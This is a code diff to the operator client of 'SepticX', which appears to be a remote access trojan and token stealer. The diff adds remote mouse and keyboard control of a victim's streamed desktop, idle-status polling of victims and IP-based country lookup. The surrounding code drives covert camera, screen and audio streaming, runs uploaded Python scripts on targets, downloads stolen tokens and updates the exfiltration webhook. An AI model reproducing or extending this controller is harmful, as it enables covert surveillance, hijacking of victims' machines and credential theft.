@@ -76,7 +76,7 @@ class Controller(customtkinter.CTkFrame):
         self.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)
         self.server_address = master.server_address
         self.server_key = master.server_key
-        self.ws = master.ws
+        self.master = master
 
         self.master = master
 
@@ -148,7 +148,7 @@ class Controller(customtkinter.CTkFrame):
                 elif button_name == "Run PY script":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
-                        command=lambda command=command: self.send_command(command, target, True), 
+                        command=lambda command=command: self.master.send_command(command, target, True), 
                         fg_color="#1b6e63",
                         text_color="white"
                     )
@@ -188,7 +188,7 @@ class Controller(customtkinter.CTkFrame):
                 elif command == "streamCamera":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 0)), 
+                        command=lambda command=command: (self.master.send_command(command, target), Video(master, target, 0)), 
                         fg_color="#1b6e63",
                         text_color="white"
                     )
@@ -196,7 +196,7 @@ class Controller(customtkinter.CTkFrame):
                 elif command == "streamDesktop":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Video(master, target, 1)), 
+                        command=lambda command=command: (self.master.send_command(command, target), Video(master, target, 1)), 
                         fg_color="#1b6e63",
                         text_color="white"
                     )
@@ -204,7 +204,7 @@ class Controller(customtkinter.CTkFrame):
                 elif command == "streamAudio":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
-                        command=lambda command=command: (self.send_command(command, target), Audio(master, target)), 
+                        command=lambda command=command: (self.master.send_command(command, target), Audio(master, target)), 
                         fg_color="#1b6e63",
                         text_color="white"
                     )
@@ -218,14 +218,14 @@ class Controller(customtkinter.CTkFrame):
                     )
 
                 else:
-                    btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: (self.send_command(command, target), tkinter.messagebox.showinfo("SepticX Client", "Successfully executed command")), fg_color="#1b6e63",
+                    btn = customtkinter.CTkButton(frame, text=button_name, command=lambda command = command: (self.master.send_command(command, target), tkinter.messagebox.showinfo("SepticX Client", "Successfully executed command")), fg_color="#1b6e63",
                         text_color="white")
 
                 btn.grid(row=count + 1, column=0, padx=20, pady=5, sticky="ew")
 
     def send_message_box(self, frame, title, message, target):
         messagebox = self.messagebox
-        self.send_command(f"messageBox|{messagebox}|{title}|{message}", target)
+        self.master.send_command(f"messageBox|{messagebox}|{title}|{message}", target)
 
         tkinter.messagebox.showinfo("SepticX Client", "Successfully sent MessageBox")
 
@@ -293,7 +293,7 @@ class Controller(customtkinter.CTkFrame):
         tkinter.messagebox.showinfo("SepticX Client", "Tokens downloaded to tokens.txt")
 
     def update_webhook(self, frame, webhook, target):
-        self.send_command(f"updateWebhook|{webhook}", target)
+        self.master.send_command(f"updateWebhook|{webhook}", target)
         tkinter.messagebox.showinfo("SepticX Client", "Successfully updated webhook")
         
         frame.destroy()
@@ -317,28 +317,6 @@ class Controller(customtkinter.CTkFrame):
         submit = customtkinter.CTkButton(cover_frame, text=query, command=lambda: self.update_webhook(cover_frame, entry.get(), target))
         submit.grid(row=5, column=6, columnspan=3, sticky="nsew")
 
-    def send_command(self, command, target, file_prompt=False):
-        if file_prompt:
-            filetypes = (
-                ('All files', '*'),
-            )
-
-            filename = fd.askopenfilename(
-                title='Open a file',
-                initialdir='/',
-                filetypes=filetypes
-            )
-
-            if not filename:
-                return
-
-            command = open(filename, 'r+').read()
-
-        self.ws.send(json.dumps({
-            "code": command,
-            "target": target
-        }))
-
 
 class Video(customtkinter.CTkToplevel):
     def __init__(self, master, target, option=None):
@@ -347,7 +325,7 @@ class Video(customtkinter.CTkToplevel):
         self.server_address = master.server_address
         self.server_key = master.server_key
         self.target = target
-        self.ws = master.ws
+        self.master = master
 
         if not option:
             self.endpoint = "showCamera"
@@ -357,11 +335,11 @@ class Video(customtkinter.CTkToplevel):
         btn = customtkinter.CTkButton(self, text="X", fg_color="#435250", command=self.kill_proc)
         btn.grid(row=0, column=0, columnspan=4, padx=5, pady=5, sticky="ew")
 
-        for i in range(11): # Set 11 rows
-            self.rowconfigure(i, weight= 1)
-        
-        for i in range(1): # Set 1 columns
-            self.columnconfigure(i, weight= 1)  
+        for i in range(11):  # Set 11 rows
+            self.rowconfigure(i, weight=1)
+
+        for i in range(1):  # Set 1 column
+            self.columnconfigure(i, weight=1)
 
         self.minsize(500, 300)
         self.title(f"{target}'s {self.endpoint[4:]}")
@@ -369,15 +347,20 @@ class Video(customtkinter.CTkToplevel):
         self.lift()
 
         self.width, self.height = (500, 300)
-    
+
         screen = customtkinter.CTkLabel(self, text="Loading...")
         screen.grid(row=1, column=0, rowspan=10, sticky="nsew")
-
+        screen.bind("<Button-1>", self.on_image_click)  # Bind left mouse click to the image
+        self.bind("<KeyPress>", self.on_key_press)  # Bind keyboard events
+        self.bind("<KeyRelease>", self.on_key_release)  # Bind keyboard events
         self.screen = screen
-        ws = websocket.WebSocketApp(f"wss://{self.server_address}/api/ws/{self.endpoint}",
-                              on_open=self.on_open,
-                              on_message=self.on_message,
-                              on_error=self.kill_proc)
+
+        ws = websocket.WebSocketApp(
+            f"wss://{self.server_address}/api/ws/{self.endpoint}",
+            on_open=self.on_open,
+            on_message=self.on_message,
+            on_error=self.kill_proc,
+        )
 
         threading.Thread(target=ws.run_forever).start()
 
@@ -387,17 +370,20 @@ class Video(customtkinter.CTkToplevel):
 
     def on_message(self, ws, recv_data):
         image = Image.open(io.BytesIO(zlib.decompress(base64.b64decode(recv_data))))
-
         self.update_display(image)
 
     def kill_proc(self):
-        command = self.endpoint.replace('show', 'stop').replace('Screen', 'Desktop')
-        
+        command = self.endpoint.replace("show", "stop").replace("Screen", "Desktop")
+
         try:
-            self.ws.send(json.dumps({
-                "code": command,
-                "target": self.target
-            }))
+            self.master.ws.send(
+                json.dumps(
+                    {
+                        "code": command,
+                        "target": self.target,
+                    }
+                )
+            )
         except:
             pass
 
@@ -405,8 +391,62 @@ class Video(customtkinter.CTkToplevel):
         self.destroy()
 
     def update_display(self, image):
-        image = customtkinter.CTkImage(dark_image=image, light_image=image, size=(self.winfo_width()*0.8, self.winfo_height()*0.8))
+        image = customtkinter.CTkImage(
+            dark_image=image,
+            light_image=image,
+            size=(self.winfo_width() * 0.8, self.winfo_height() * 0.8),
+        )
         self.screen.configure(image=image, text="")
+
+    def on_image_click(self, event):
+        widget_width = self.screen.winfo_width()
+        widget_height = self.screen.winfo_height()
+
+        normalized_x = event.x / widget_width / 0.8
+        normalized_y = event.y / widget_height / 0.92
+
+        self.handle_click(normalized_x, normalized_y)
+
+    def handle_click(self, x, y):
+        print(f"Clicked at normalized coordinates: ({x:.2f}, {y:.2f})")
+        self.master.ws.send(
+                json.dumps(
+                    {
+                        "code": f"click|{x}|{y}",
+                        "target": self.target
+                    }
+                )
+            )
+
+    def on_key_press(self, event):
+        key = event.keysym
+        self.handle_key_press(key)
+
+    def handle_key_press(self, key):
+        print(f"Key pressed: {key}")
+        self.master.ws.send(
+            json.dumps(
+                {
+                    "code": f"pressKey|{key}",
+                    "target": self.target,
+                }
+            )
+        )
+
+    def on_key_release(self, event):
+        key = event.keysym
+        self.handle_key_release(key)
+
+    def handle_key_release(self, key):
+        print(f"Key released: {key}")
+        self.master.ws.send(
+            json.dumps(
+                {
+                    "code": f"releaseKey|{key}",
+                    "target": self.target,
+                }
+            )
+        )
 
 
 class Audio(customtkinter.CTkToplevel):
@@ -416,7 +456,7 @@ class Audio(customtkinter.CTkToplevel):
         self.server_address = master.server_address
         self.server_key = master.server_key
         self.target = target
-        self.ws = master.ws
+        self.master = master
         self.stop = False
 
         self.minsize(300, 300)
@@ -487,7 +527,7 @@ class Audio(customtkinter.CTkToplevel):
 
     def kill_proc(self):
         try:
-            self.ws.send(json.dumps({
+            self.master.ws.send(json.dumps({
                 "code": "stopAudio",
                 "target": self.target
             }))
@@ -952,6 +992,36 @@ class App(customtkinter.CTk):
 
         self.get_address()
 
+    def send_command(self, command, target, file_prompt=False, recv=False):
+        if file_prompt:
+            filetypes = (
+                ('All files', '*'),
+            )
+
+            filename = fd.askopenfilename(
+                title='Open a file',
+                initialdir='/',
+                filetypes=filetypes
+            )
+
+            if not filename:
+                return
+
+            command = open(filename, 'r+').read()
+
+        try:
+            self.ws.send(json.dumps({
+            "code": command,
+            "target": target
+            }))
+            
+            if recv:
+                self.ws.settimeout(10)  # Set a timeout of 10 seconds
+                return self.ws.recv()
+        except websocket.WebSocketTimeoutException:
+            tkinter.messagebox.showerror("SepticX Client", "Request timed out.")
+            return None
+
     def get_address(self):
         key_frame = customtkinter.CTkFrame(self, corner_radius=15)
         key_frame.grid(row=1, column=6, padx=20, pady=20, sticky="nsew", columnspan=6, rowspan=18)
@@ -1050,12 +1120,13 @@ class App(customtkinter.CTk):
 
             self.ws = ws
 
-    def update_profiles(self, main_frame, computers=[]):
+    def update_profiles(self, main_frame, computers=None):
         if computers == self.computers:
             self.after(1000, self.update_profiles, main_frame, computers)
             return
 
         computers = list(self.computers)
+        print(computers)
         table_values = []
 
         profiles = json.load(open("computers.json", "r+"))
@@ -1077,8 +1148,21 @@ class App(customtkinter.CTk):
             else:
                 version = "Beta"
 
-            ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
-            country = ipinfo['country']
+            tries = 5
+            while tries != 0:
+                ipinfo = requests.get(f"http://ip-api.com/json/{ip_address}").json()
+                
+                if 'country' not in ipinfo:
+                    print(ipinfo)
+                    time.sleep(1)
+                    tries -= 1
+                    continue
+
+                country = ipinfo['country']
+                break
+
+            else:
+                country = "Rate Limited"
 
             offline_computers.append([country, username, ip_address, "Offline", version, "More Options"])
 
@@ -1097,8 +1181,40 @@ class App(customtkinter.CTk):
             else:
                 version = "Beta"
 
-            ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
-            country = ipinfo['country']
+            idle_time = self.send_command("status", computer)
+            print(f"Idle time of {computer}: {idle_time}")
+            if not idle_time or idle_time < 60: # If idle time is less than a minute, assume online
+                status = "Online"
+
+            else:
+                units = [
+                    "seconds",
+                    "minutes",
+                    "hours"
+                ]
+
+                idle_time = int(idle_time)
+                idx = min(math.floor(math.log(idle_time, 60)), 2)
+                unit = units[idx]
+                converted_time = round(idle_time / 60 ** idx, 2)
+
+                status = f"Idle: {converted_time} {units}"
+
+            tries = 5
+            while tries != 0:
+                ipinfo = requests.get(f"http://ip-api.com/json/{ip_address}").json()
+                
+                if 'country' not in ipinfo:
+                    print(ipinfo)
+                    time.sleep(1)
+                    tries -= 1
+                    continue
+
+                country = ipinfo['country']
+                break
+
+            else:
+                country = "Rate Limited"
 
             if computer not in profiles:
                 threading.Thread(target=self.toast.show_toast, args=("SepticX", f"New client connected! {computer}")).start()
@@ -1124,6 +1240,7 @@ class App(customtkinter.CTk):
 
         username = self.table.get(row, 1)
         ip_address = self.table.get(row, 2)
+        version = self.table.get(row, 4)
 
         value = self.table.get(row, column)
 
@@ -1131,7 +1248,11 @@ class App(customtkinter.CTk):
             return
 
         if column == len(self.header) - 1:
-            Controller(self, f"{username}|{ip_address}")
+
+            if version != "Beta":
+                Controller(self, f"{username}|{ip_address}|{version}")
+            else:
+                Controller(self, f"{username}|{ip_address}")
 
         else:
             self.clipboard_clear() 
@@ -1155,7 +1276,7 @@ class App(customtkinter.CTk):
 
         # Profile(master=main_frame, title=True, pady=1)
         
-        self.after(0, self.update_profiles, main_frame)
+        self.after(50, self.update_profiles, main_frame)
 
     @staticmethod
     def banner():
